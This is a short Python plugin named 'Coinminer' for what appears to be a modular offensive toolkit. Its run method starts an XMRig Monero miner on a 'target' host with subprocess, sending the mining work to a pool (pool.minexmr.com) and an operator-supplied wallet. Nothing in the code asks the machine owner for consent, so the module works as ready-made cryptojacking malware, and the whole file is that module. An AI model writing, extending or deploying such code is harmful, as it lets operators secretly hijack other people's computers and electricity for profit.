from core.plugin_base import PluginBase
import subprocess

class CoinminerPlugin(PluginBase):
    @property
    def name(self): return "Coinminer"
    @property
    def description(self): return "Launches XMRig (Monero miner) or similar miner on host."

    def run(self, target="local", pool="pool.minexmr.com:4444", wallet="", **kwargs):
        try:
            if not wallet:
                return "No wallet specified. Usage: wallet=<monero_wallet_addr>"
            # Path to XMRig or similar miner (assumed downloaded for now)
            xmrig_path = "./xmrig.exe"
            cmd = [xmrig_path, "-o", pool, "-u", wallet, "-p", "x"]
            subprocess.Popen(cmd)
            return f"Started mining on {target} for {wallet} using {pool}"
        except Exception as e:
            return f"Coinminer failed: {e}"

def get_plugin():
    return CoinminerPlugin()
